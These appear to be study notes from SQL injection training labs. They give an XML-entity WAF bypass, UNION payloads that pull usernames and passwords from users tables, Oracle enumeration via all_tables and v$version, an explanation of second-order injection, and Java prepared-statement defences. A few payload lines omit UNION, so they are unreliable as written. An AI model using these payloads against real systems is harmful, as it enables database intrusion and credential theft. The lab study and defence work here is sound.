These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the`S`character in`SELECT`:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter.

## Lab: SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a`users`table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
  <storeId>
    <@hex_entities>1 UNION SELECT username||':'||password from users
    <@/hex_entities>
  </storeId>
</stockCheck>
```

## Second-order SQL injection

First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.

Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.

Second-order SQL injection often occurs in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.

## How to prevent SQL injection

You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".

The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

You can rewrite this code in a way that prevents the user input from interfering with the query structure:

```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

## How to prevent SQL injection - Continued

You can use parameterized queries for any situation where untrusted input appears as data within the query, including the`WHERE`clause and values in an`INSERT`or`UPDATE`statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the`ORDER BY`clause. Application functionality that places untrusted data into these parts of the query needs to take a different approach, such as:

- Whitelisting permitted input values.
- Using different logic to deliver the required behavior.

For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant. It must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It's easy to make mistakes about the possible origin of data, or for changes in other code to taint trusted data.

# Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

```
/filter?category=Gifts' ORDER BY 2-- -have 2 column

/filter?category=Gifts' SELECT null,null-- -ERROR

/filter?category=Gifts' SELECT null,null from dual-- -Good

/filter?category=Gifts' UNION SELECT banner,null FROM v$version-- -
```

# Lab: SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the`administrator`user.

```
/filter?category=Gifts' union SELECT table_name,null FROM all_tables--

/filter?category=Gifts' union SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_VZNTQG'--

/filter?category=Gifts' union SELECT USERNAME_OIBKHU,PASSWORD_SIFBED FROM USERS_VZNTQG--
```

